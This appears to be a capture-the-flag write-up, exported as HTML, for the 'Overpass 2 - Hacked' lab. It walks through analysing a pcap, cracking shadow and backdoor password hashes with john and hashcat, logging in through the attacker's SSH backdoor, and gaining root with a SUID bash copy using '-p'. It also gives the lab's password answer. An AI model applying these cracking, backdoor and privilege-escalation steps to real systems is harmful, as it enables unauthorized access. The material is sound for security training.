<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>overpass-2 hacked</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>overpass-2 hacked</h1><br/><p><strong>Overpass 2 - Hacked</strong></p><p><strong></strong></p><p>Open the attached pcap file in wireshark to analyze it.</p><p></p><p>Proceed with follow TCP stream and increament TCP Stream value in bottom right to see different connections and answer the questions.</p><p></p><p>The portion where we need to crack the Linux Passwords, Following is the walkthrough</p><p></p><p>   1) We get dumped shadow file from &quot;TCP Stream-3&quot; and save it to a hash file.</p><p>   2) <em><strong>john</strong></em><strong> --wordlist=/usr/share/wordlist/fasttrack.txt overpass2-hash   </strong></p><p></p><p>Study the github code for all backdoor questions.</p><p></p><p><em><strong>https://github.com/NinjaJc01/ssh-backdoor</strong></em></p><p></p><p>Notice we get a hardcoded salt from the code:</p><p>1c362db832f3f864c8c2fe05f2002a05</p><p>We also have a hash in the pcap file</p><p>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</p><p></p><p>Seeing the hashcat wiki:</p><p></p><p><strong>1710 | sha512($pass.$salt)                                 | Raw Hash salted and/or iterated</strong></p><p></p><p>Thus we need to combine the password hash and salt in our <strong>hash file</strong></p><p><strong>Note:</strong> Separator is <strong>&#39;:&#39;</strong></p><p></p><p>eg.</p><p>Password_hash:salt</p><p></p><p>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05</p><p></p><p>This is kept in a file and fed to hashcat.</p><p></p><p><em><strong>hashcat -m 1710 overpass2-new-hash /usr/share/wordlists/rockyou.txt</strong></em></p><p></p><p>We cracked the Password as : <em><strong>november16</strong></em></p><p></p><p></p><p>Now we will connect back to the machine using the backdoor the hacker created.</p><p></p><p>Note:</p><p><em><strong>ssh james@10.10.131.235 -p 2222 </strong></em></p><p>The above should work. But it fails in Kali Linux</p><p></p><p></p><p>The following command works. Here we are explicitly mentioning <strong>ssh-rsa</strong> as one of the supported <strong>HostKeyAlgorithms</strong></p><p><em><strong>ssh  -o HostKeyAlgorithms\ ssh-rsa james@10.10.131.235 -p 2222</strong></em></p><p></p><p>From here we get the user flag.</p><p></p><p><strong>Root Flag</strong></p><p></p><p>For root flag we find a suid bit set file named <strong>“.suid_bash”</strong></p><p></p><p>If we run it </p><p><strong>./.suid_bash</strong></p><p>ID</p><p><em><strong>uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)</strong></em></p><p></p><p>We wont get root access as it takes an argument.</p><p></p><p>However if we run as below:</p><p><strong>./.suid_bash -p</strong></p><p><strong></strong>ID</p><p><em><strong>uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)</strong></em></p><p></p><p>The <strong>euid</strong> and <strong>egid</strong> are Effective User ID and Effective Group ID.</p><p>The <strong>-p</strong> flag will preserve the permissions. Thus we will have a root shell and get the root flag.</p><p></p><p>Thanks!! </p></div>
</body>
</html>
